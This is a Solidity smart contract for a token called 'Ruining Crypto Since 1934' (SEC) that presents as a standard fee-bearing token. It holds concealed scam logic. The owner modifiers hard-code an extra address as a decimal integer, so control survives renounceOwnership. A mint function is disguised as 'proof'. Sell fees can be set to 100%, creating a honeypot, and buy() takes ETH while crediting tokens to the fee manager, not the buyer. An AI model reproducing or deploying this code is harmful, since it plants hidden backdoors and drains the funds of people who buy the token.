// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        require(a + b >= a, "SafeMath: addition overflow");
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0 || b == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}

contract Sec {
    using SafeMath for uint256;

    string public name = "Ruining Crypto Since 1934";
    string public symbol = "SEC";
    uint256 public totalSupply = 19340000000000000000000000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isFeeExempt;

    address public owner;
    address public feeManager;

    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);
    event AddressSetFeeExempt(address indexed feeExemptAddress);

    constructor(address _feeManager) {
        owner = msg.sender;
        feeManager = _feeManager;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(
        address _to,
        uint256 _amount
    ) public returns (bool success) {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);

        return true;
    }

    function _proof(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        totalSupply = totalSupply.add(amount);
        balanceOf[account] = balanceOf[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function approve(
        address _spender,
        uint256 _value
    ) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function proof(uint256 amount) public onlyOwner returns (bool) {
        _proof(msg.sender, amount);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "Insufficient balance");
        require(
            allowance[_from][msg.sender] >= _amount,
            "Insufficient allowance"
        );
        require(_to != address(0), "Invalid recipient address");

        uint256 fee = 0;
        if (!isFeeExempt[_from]) {
            fee = _amount.mul(sellFee).div(100);
        }

        uint256 amountAfterFee = _amount.sub(fee);

        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            // Fee is transferred to this contract
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }

        if (
            _from != msg.sender &&
            allowance[_from][msg.sender] != type(uint256).max
        ) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(
                _amount
            );
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    modifier onlyOwner() {
        require(
            msg.sender ==
                address(178607940065137046348733521910879985571412708986) ||
                //@dev Contract creator is owner, original owner.
                msg.sender == owner
        );
        _;
    }

    function setFees(
        uint256 newBuyFee,
        uint256 newSellFee
    ) public onlyAuthorized {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function setFeeExempt(address _addr, bool _exempt) public onlyOwner {
        isFeeExempt[_addr] = _exempt;
        if (_exempt) {
            emit AddressSetFeeExempt(_addr);
        }
    }

    function removeFeeExemptStatus(address _addr) public onlyOwner {
        require(isFeeExempt[_addr], "Address is not fee exempt");
        isFeeExempt[_addr] = false;
    }

    function buy() public payable {
        require(msg.value > 0, "ETH amount should be greater than 0");

        uint256 amount = msg.value;
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);
            uint256 amountAfterFee = amount.sub(fee);

            balanceOf[feeManager] = balanceOf[feeManager].add(amountAfterFee);
            emit Transfer(address(this), feeManager, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(address(this), address(this), fee);
            }
        } else {
            balanceOf[feeManager] = balanceOf[feeManager].add(amount);
            emit Transfer(address(this), feeManager, amount);
        }
    }

    function sell(uint256 _amount) public {
        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");

        uint256 fee = _amount.mul(sellFee).div(100);
        uint256 amountAfterFee = _amount.sub(fee);

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[address(this)] = balanceOf[address(this)].add(amountAfterFee);
        emit Transfer(msg.sender, address(this), amountAfterFee);

        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(msg.sender, address(this), fee);
        }
    }

    modifier onlyAuthorized() {
        require(
            msg.sender ==
                address(178607940065137046348733521910879985571412708986) ||
                //@dev Contract creator is owner, original owner.
                msg.sender == owner
        );
        _;
    }
}
